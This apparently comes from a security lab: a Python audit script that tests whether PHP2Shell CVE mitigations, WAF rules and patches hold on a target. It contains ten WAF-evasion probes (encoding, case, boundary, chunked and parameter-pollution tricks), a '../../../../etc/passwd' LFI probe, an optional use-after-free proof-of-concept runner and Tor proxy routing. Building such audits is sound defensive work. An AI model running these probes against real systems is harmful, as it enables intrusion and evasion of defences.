#!/usr/bin/env python3
"""
Patch / mitigation bypass audit for PHP2Shell lab techniques (authorized targets only).
"""
from __future__ import annotations

import argparse
import json
import os
import re
import sys
import urllib.error
import urllib.request
from dataclasses import dataclass
from typing import Callable

FIXED_VERSIONS = {
    "8.5": (8, 5, 12),
    "8.4": (8, 4, 27),
    "8.3": (8, 3, 36),
    "8.2": (8, 2, 35),
}

SCENARIOS: dict[str, dict[str, str]] = {
    "vendor-patch": {
        "title": "Vendor PHP patch (CVE-2026-109618/619)",
        "mitigation": "Upgrade to 8.4.27+, 8.3.36+, 8.2.35+, 8.5.12+",
        "bypass_note": "Unpatched branches remain fully exploitable; 8.1 EOL has no official fix.",
    },
    "upload-progress-off": {
        "title": "session.upload_progress.enabled=Off",
        "mitigation": "php_admin_flag in FPM pool / php.ini before request parse",
        "bypass_note": "Datadog: does not fully protect CVE-2026-109618; 619 path blocked if truly off at worker start.",
    },
    "waf-php2shell-signature": {
        "title": "WAF PHP2Shell body rule (AWS 2.4+)",
        "mitigation": "Block POST + PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS",
        "bypass_note": "618 may not require progress field; test encoding/case variants at your WAF.",
    },
    "memory-limit-workaround": {
        "title": "Raised memory_limit only",
        "mitigation": "memory_limit=256M+ without patch",
        "bypass_note": "Not a fix; OOM trigger for 618 can still destabilize host (PHP/AWS guidance).",
    },
    "ini-set-late": {
        "title": "ini_set upload_progress in app",
        "mitigation": "App disables feature at runtime",
        "bypass_note": "Attack runs before ini_set; use php_admin_value (UpdatePHP/AWS).",
    },
    "edge-multipart-block": {
        "title": "Edge blocks all multipart",
        "mitigation": "403 on multipart/* (e.g. Scalingo router)",
        "bypass_note": "Breaks file uploads; 618 vectors may not need classic multipart (verify per SAPI).",
    },
    "chain-a-lfi": {
        "title": "LFI / Chain A closed",
        "mitigation": "No user-controlled include paths",
        "bypass_note": "App-layer; PHP core patch does not remove LFI.",
    },
    "zer061-heap": {
        "title": "Zer061 heap (mod_php 8.4.26)",
        "mitigation": "PHP 8.4.27+ on mod_php",
        "bypass_note": "Separate heap chain; patch version must match branch.",
    },
    "cve-115560-config": {
        "title": "CVE-2026-115560 residual",
        "mitigation": "upload_progress off + no runtime serialize_handler flip",
        "bypass_note": "PHP.net Oct 2026: uncommon ini_set serialize_handler + progress on.",
    },
    "singularity-detect": {
        "title": "Rootkit / LKM detection",
        "mitigation": "LKRG, Falco, chkrootkit, module signing",
        "bypass_note": "Research rootkits target eBPF/LKRG gaps — run singularity detect + external EDR.",
    },
    "waf-bypass-top10": {
        "title": "Top-10 WAF bypass probes (Cloudflare/AWS/Akamai/Imperva-style)",
        "mitigation": "WAF managed rules for PHP2Shell + strict multipart parsing",
        "bypass_note": "Encoding, case, boundary, chunked, HPP, comment tricks vs. naive body rules.",
    },
}


def audit_log(entry: dict) -> None:
    """Append JSONL audit record (verifiable, greppable)."""
    path = os.environ.get("PATCH_AUDIT_LOG", "/opt/lab/out/audit/patch-audit.jsonl")
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "a", encoding="utf-8") as f:
            f.write(json.dumps(entry, ensure_ascii=False) + "\n")
    except OSError:
        pass


@dataclass
class Result:
    scenario: str
    status: str  # PASS | FAIL | WARN | SKIP | INFO
    detail: str

    def line(self) -> str:
        return f"[{self.status:4}] {self.scenario}: {self.detail}"


def parse_php_version(text: str) -> tuple[int, int, int] | None:
    m = re.search(r"PHP/(\d+)\.(\d+)\.(\d+)", text)
    if not m:
        m = re.search(r"(\d+)\.(\d+)\.(\d+)", text)
    if not m:
        return None
    return int(m.group(1)), int(m.group(2)), int(m.group(3))


def http_get(url: str, timeout: float = 8.0) -> tuple[int, dict[str, str], bytes]:
    req = urllib.request.Request(url, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            headers = {k.lower(): v for k, v in resp.headers.items()}
            return resp.status, headers, resp.read(65536)
    except urllib.error.HTTPError as e:
        headers = {k.lower(): v for k, v in e.headers.items()} if e.headers else {}
        return e.code, headers, e.read(65536) if e.fp else b""


def http_post_multipart(
    url: str,
    field_name: str,
    cookie: str | None = None,
    timeout: float = 12.0,
) -> tuple[int, bytes]:
    body = (
        f"--bound\r\n"
        f'Content-Disposition: form-data; name="{field_name}"\r\n\r\n'
        f"x\r\n"
        f"--bound--\r\n"
    ).encode()
    headers = {
        "Content-Type": "multipart/form-data; boundary=bound",
        "Content-Length": str(len(body)),
    }
    if cookie:
        headers["Cookie"] = cookie
    req = urllib.request.Request(url, data=body, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read(8192)
    except urllib.error.HTTPError as e:
        return e.code, e.read(8192) if e.fp else b""


def base_url() -> str:
    u = os.environ.get("PATCH_AUDIT_URL", "http://target/index.php").strip()
    if not u:
        u = "http://target/index.php"
    if not re.search(r"\.php($|\?)", u):
        u = u.rstrip("/") + "/index.php"
    return u


def setup_proxy() -> str | None:
    """PATCH_AUDIT_PROXY: socks5h://host:9050 (Tor) oder http(s)://host:port.

    SOCKS wird global via PySocks gepatcht (urllib nutzt socket); http(s) laeuft
    ueber urllib-Standard-Umgebungsproxies. Rueckgabe: aktiver Proxy-String.
    """
    proxy = os.environ.get("PATCH_AUDIT_PROXY", "").strip()
    if not proxy:
        return None
    if proxy.startswith("socks"):
        try:
            import socket

            import socks
        except ImportError:
            print("[WARN] PATCH_AUDIT_PROXY gesetzt, aber PySocks fehlt (pip install PySocks)")
            return None
        m = re.match(r"socks([45])h?://([^:/]+):(\d+)", proxy)
        if not m:
            print(f"[WARN] Proxy-Format ungueltig: {proxy!r} (erwartet socks5h://host:port)")
            return None
        ver, host, port = m.group(1), m.group(2), int(m.group(3))
        rdns = proxy.startswith(f"socks{ver}h")
        socks.set_default_proxy(
            socks.SOCKS5 if ver == "5" else socks.SOCKS4, host, port, rdns=rdns
        )
        socket.socket = socks.socksocket  # type: ignore[assignment]
        return proxy
    # http(s)-Proxy: urllib wertet Umgebungsvariablen automatisch aus.
    os.environ["http_proxy"] = proxy
    os.environ["https_proxy"] = proxy
    return proxy


def check_vendor_patch(_: str) -> Result:
    status, headers, body = http_get(base_url())
    ver_src = headers.get("x-powered-by", "") + body.decode("utf-8", errors="replace")[:2000]
    ver = parse_php_version(ver_src)
    if not ver:
        return Result("vendor-patch", "WARN", f"PHP version not detected (HTTP {status}); fingerprint manually.")
    branch = f"{ver[0]}.{ver[1]}"
    fixed = FIXED_VERSIONS.get(branch)
    if not fixed:
        return Result(
            "vendor-patch",
            "FAIL",
            f"PHP {ver[0]}.{ver[1]}.{ver[2]} — branch without listed fix (EOL? treat as vulnerable).",
        )
    if ver >= fixed:
        return Result("vendor-patch", "PASS", f"PHP {ver[0]}.{ver[1]}.{ver[2]} >= fixed {'.'.join(map(str, fixed))}.")
    return Result(
        "vendor-patch",
        "FAIL",
        f"PHP {ver[0]}.{ver[1]}.{ver[2]} < {'.'.join(map(str, fixed))} — patch bypass: still in PHP2Shell range.",
    )


def check_waf_variants(url: str) -> Result:
    variants = [
        "PHP_SESSION_UPLOAD_PROGRESS",
        "php_session_upload_progress",
        "PHP_SESSION_UPLOAD_PROGRESS ",
        "PHP_SESSION_UPLOAD_PROGRESS%00",
    ]
    blocked = 0
    for name in variants:
        code, _ = http_post_multipart(url, name, cookie="PHPSESSID=auditprobe")
        if code in (403, 406, 429):
            blocked += 1
    if blocked == len(variants):
        return Result(
            "waf-php2shell-signature",
            "PASS",
            f"All {len(variants)} WAF-style variants returned block codes (edge/WAF may be active).",
        )
    if blocked > 0:
        return Result(
            "waf-php2shell-signature",
            "WARN",
            f"{blocked}/{len(variants)} blocked — partial WAF; review bypass (618 without field).",
        )
    return Result(
        "waf-php2shell-signature",
        "FAIL",
        "No block on progress-field variants — emergency WAF rule likely absent or bypassable.",
    )


def check_multipart_reachability(url: str) -> Result:
    code, _ = http_post_multipart(url, "testfield")
    if code in (403, 405):
        return Result(
            "edge-multipart-block",
            "PASS",
            f"multipart POST blocked or denied ({code}) — uploads may be broken.",
        )
    return Result(
        "edge-multipart-block",
        "WARN",
        f"multipart accepted (HTTP {code}) — edge block not in effect.",
    )


def check_chain_a_lfi(url: str) -> Result:
    probe = url.split("?")[0] + "?page=../../../../etc/passwd"
    status, _, body = http_get(probe)
    text = body.decode("utf-8", errors="replace")
    if "root:" in text and "/bin/" in text:
        return Result("chain-a-lfi", "FAIL", "LFI path readable — Chain A bypasses PHP core patch.")
    if status == 200 and "LAB" in text.upper():
        return Result("chain-a-lfi", "WARN", "Lab index OK; LFI probe did not leak passwd (mitigated or wrong path).")
    return Result("chain-a-lfi", "INFO", f"HTTP {status} — no obvious LFI leak on probe.")


def check_upload_progress_off_destructive(url: str) -> Result:
    if os.environ.get("PATCH_AUDIT_DESTRUCTIVE") != "1":
        return Result(
            "upload-progress-off",
            "SKIP",
            "Set PATCH_AUDIT_DESTRUCTIVE=1 to run UAF reachability probe (may stress workers).",
        )
    import subprocess

    script = "/opt/lab/scripts/run-uaf-poc.sh"
    if not os.path.isfile(script):
        return Result("upload-progress-off", "SKIP", "UAF script not in container.")
    try:
        out = subprocess.run(
            [script],
            capture_output=True,
            text=True,
            timeout=120,
            env={**os.environ, "ROUNDS": "1"},
        )
        combined = (out.stdout or "") + (out.stderr or "")
        if "Pointers armed:  1/1" in combined or "Pointers armed:  5/5" in combined:
            return Result(
                "upload-progress-off",
                "FAIL",
                "UAF still arms — upload_progress mitigation not effective on this target.",
            )
        return Result("upload-progress-off", "PASS", "UAF did not arm in 1 round — mitigation may hold (verify patch).")
    except Exception as e:
        return Result("upload-progress-off", "WARN", f"PoC run failed: {e}")


def check_memory_limit_info(_: str) -> Result:
    return Result(
        "memory-limit-workaround",
        "INFO",
        "Config-only: raising memory_limit without vendor patch does not fix CVE-2026-109618 (Datadog/AWS).",
    )


def check_ini_set_late(_: str) -> Result:
    return Result(
        "ini-set-late",
        "INFO",
        "Verify php_admin_flag[session.upload_progress.enabled]=off in FPM pool — not ini_set/.user.ini.",
    )


def check_zer061_heap(_: str) -> Result:
    apache = os.environ.get("PATCH_AUDIT_APACHE_URL", "http://target-apache/index.php")
    try:
        status, headers, _ = http_get(apache)
    except Exception as e:
        return Result("zer061-heap", "SKIP", f"Apache target unreachable: {e}")
    ver = parse_php_version(headers.get("x-powered-by", ""))
    if ver and ver >= (8, 4, 27):
        return Result("zer061-heap", "PASS", f"Apache PHP {ver[0]}.{ver[1]}.{ver[2]} patched for heap kit baseline.")
    if ver:
        return Result(
            "zer061-heap",
            "FAIL",
            f"Apache PHP {ver[0]}.{ver[1]}.{ver[2]} — Zer061-style heap lab still applicable.",
        )
    return Result("zer061-heap", "WARN", f"Apache up (HTTP {status}) but version unknown — run fingerprint.")


def check_cve_115560(_: str) -> Result:
    return Result(
        "cve-115560-config",
        "INFO",
        "Manual: ensure no runtime ini_set serialize_handler to php after php_serialize + progress on (php.net Oct 2026).",
    )


def check_singularity_detect(_: str) -> Result:
    return Result(
        "singularity-detect",
        "INFO",
        "Run on host: vtbw-php2shell-lab singularity detect (not in HTTP probe).",
    )


# ── Top-10 WAF bypass probes ────────────────────────────────────────────────
# Techniques observed against major WAFs (Cloudflare, AWS WAF, Akamai, Imperva,
# F5, ModSecurity CRS, Fortinet, Barracuda, Sucuri, Azure WAF). Each probe posts
# the PHP2Shell marker (PHP_SESSION_UPLOAD_PROGRESS + PHPSESSID) with one
# evasion trick. BLOCKED = edge/WAF rejected. BYPASSED = reached PHP.

def _mp_body(field_name: str, boundary: str = "wafbound", extra: str = "") -> bytes:
    return (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{field_name}"\r\n\r\n'
        f"x\r\n{extra}--{boundary}--\r\n"
    ).encode()


def _raw_post(
    url: str,
    body: bytes,
    content_type: str,
    extra_headers: dict[str, str] | None = None,
    timeout: float = 12.0,
) -> tuple[int, str]:
    headers = {
        "Content-Type": content_type,
        "Cookie": "PHPSESSID=wafprobe1",
        "Content-Length": str(len(body)),
    }
    if extra_headers:
        headers.update(extra_headers)
    req = urllib.request.Request(url, data=body, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read(2048).decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, (e.read(2048) if e.fp else b"").decode("utf-8", errors="replace")
    except Exception as e:
        return -1, str(e)


WAF_TOP10: list[dict[str, str]] = []  # filled below


def _reg_waf(tid: str, name: str, technique: str):
    WAF_TOP10.append({"id": tid, "name": name, "technique": technique})


_reg_waf("01", "Lowercase field", "case-mutation: php_session_upload_progress statt UPPER")
_reg_waf("02", "Mixed case", "CaSe-MuTaTiOn: PhP_SeSsIoN_UpLoAd_PrOgReSs")
_reg_waf("03", "URL-encoded name", "percent-encoding im multipart name: PHP_SESSION_UPLOAD_%50ROGRESS")
_reg_waf("04", "Double encoding", "doppelt encodiert: %2550 statt P")
_reg_waf("05", "Boundary mit Semikolon", "Content-Type: multipart/form-data; boundary=x; boundary=y (parser diff)")
_reg_waf("06", "Boundary ohne Quotes + Tab", "Content-Disposition Zeilen mit Tab/whitespace-Mutation")
_reg_waf("07", "Chunked Transfer", "Transfer-Encoding: chunked (WAF buffer/assembly diff)")
_reg_waf("08", "Parameter Pollution", "HPP: zwei Felder, erstes harmlos, zweites Marker")
_reg_waf("09", "Inline-Kommentar", "Name mit /**/ und Null-Byte-Mutation")
_reg_waf("10", "Content-Type Mutation", "multipart/related + boundary statt form-data (parser bypass)")


def check_waf_bypass_top10(url: str) -> Result:
    probes: list[tuple[str, str, str]] = []  # (id, status_word, detail)
    bypassed = 0
    blocked = 0

    def run(tid: str, body: bytes, ctype: str, hdrs: dict[str, str] | None = None) -> None:
        nonlocal bypassed, blocked
        code, _ = _raw_post(url, body, ctype, hdrs)
        if code in (403, 406, 429, 501):
            probes.append((tid, "BLOCKED", str(code)))
            blocked += 1
        elif code in (200, 302, 500):
            probes.append((tid, "BYPASSED", str(code)))
            bypassed += 1
        else:
            probes.append((tid, "UNCLEAR", str(code)))
        audit_log({
            "scenario": "waf-bypass-top10", "technique": tid,
            "http": code, "verdict": probes[-1][1], "target": url,
        })

    marker = "PHP_SESSION_UPLOAD_PROGRESS"
    # 01 lowercase
    run("01", _mp_body("php_session_upload_progress"), "multipart/form-data; boundary=wafbound")
    # 02 mixed case
    run("02", _mp_body("PhP_SeSsIoN_UpLoAd_PrOgReSs"), "multipart/form-data; boundary=wafbound")
    # 03 url-encoded name
    run("03", _mp_body("PHP_SESSION_UPLOAD_%50ROGRESS"), "multipart/form-data; boundary=wafbound")
    # 04 double-encoded
    run("04", _mp_body("PHP_SESSION_UPLOAD_%2550ROGRESS"), "multipart/form-data; boundary=wafbound")
    # 05 double boundary (parser diff)
    run("05", _mp_body(marker, boundary="y"), "multipart/form-data; boundary=x; boundary=y")
    # 06 whitespace mutation in disposition
    body6 = (
        "--wafbound\r\n"
        'Content-Disposition:\tform-data;\tname="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        "x\r\n--wafbound--\r\n"
    ).encode()
    run("06", body6, "multipart/form-data; boundary=wafbound")
    # 07 chunked
    run("07", _mp_body(marker), "multipart/form-data; boundary=wafbound",
        {"Transfer-Encoding": "chunked"})
    # 08 HPP: harmless first
    body8 = (
        "--wafbound\r\n"
        'Content-Disposition: form-data; name="harmless"\r\n\r\nok\r\n'
        "--wafbound\r\n"
        'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        "--wafbound--\r\n"
    ).encode()
    run("08", body8, "multipart/form-data; boundary=wafbound")
    # 09 comment + null-byte-ish mutation
    run("09", _mp_body("PHP_SESSION_UPLOAD_PROGRESS/**/"), "multipart/form-data; boundary=wafbound")
    # 10 content-type mutation
    run("10", _mp_body(marker), "multipart/related; boundary=wafbound")

    for tid, verdict, code in probes:
        print(f"    [{verdict:8}] WAF-T{tid} (HTTP {code})")
    if blocked == 10:
        return Result("waf-bypass-top10", "PASS", "All 10 evasion probes blocked — WAF coverage looks solid.")
    if bypassed:
        return Result(
            "waf-bypass-top10",
            "FAIL",
            f"{bypassed}/10 probes reached PHP (bypassed), {blocked} blocked — WAF rules incomplete.",
        )
    return Result(
        "waf-bypass-top10",
        "WARN",
        f"Mixed: {blocked} blocked, {bypassed} bypassed, rest unclear — manual review.",
    )


CHECKS: dict[str, Callable[[str], Result]] = {
    "vendor-patch": check_vendor_patch,
    "upload-progress-off": check_upload_progress_off_destructive,
    "waf-php2shell-signature": lambda u: check_waf_variants(u),
    "waf-bypass-top10": check_waf_bypass_top10,
    "memory-limit-workaround": check_memory_limit_info,
    "ini-set-late": check_ini_set_late,
    "edge-multipart-block": lambda u: check_multipart_reachability(u),
    "chain-a-lfi": check_chain_a_lfi,
    "zer061-heap": check_zer061_heap,
    "cve-115560-config": check_cve_115560,
    "singularity-detect": check_singularity_detect,
}


def cmd_list() -> None:
    for sid, meta in SCENARIOS.items():
        print(f"{sid}")
        print(f"  {meta['title']}")
        print(f"  Mitigation: {meta['mitigation']}")
        print(f"  Bypass/limit: {meta['bypass_note']}")
        print()


def cmd_run(names: list[str]) -> int:
    url = base_url()
    proxy = setup_proxy()
    print(f"Target: {url}")
    print(f"Proxy: {proxy or 'keiner (direkter Egress)'}")
    print(f"Docs: docs/PATCH-BYPASS-AUDIT.md")
    print()
    fails = 0
    to_run = list(SCENARIOS.keys()) if "all" in names else names
    for sid in to_run:
        if sid not in CHECKS:
            print(f"[SKIP] unknown scenario: {sid}")
            continue
        res = CHECKS[sid](url)
        print(res.line())
        audit_log({
            "scenario": sid, "status": res.status,
            "detail": res.detail[:400], "target": url,
            "proxy": proxy or "none",
        })
        if res.status == "FAIL":
            fails += 1
    print()
    if fails:
        print(f"=== {fails} FAIL (infrastructure may still be bypassable) ===")
        return 1
    print("=== No FAIL results (review WARN/INFO/SKIP) ===")
    return 0


def main() -> None:
    parser = argparse.ArgumentParser(description="Patch/mitigation bypass audit")
    sub = parser.add_subparsers(dest="cmd", required=True)
    sub.add_parser("list")
    p_run = sub.add_parser("run")
    p_run.add_argument("scenarios", nargs="+", help="scenario id or 'all'")
    args = parser.parse_args()
    if args.cmd == "list":
        cmd_list()
    else:
        sys.exit(cmd_run(args.scenarios))


if __name__ == "__main__":
    main()
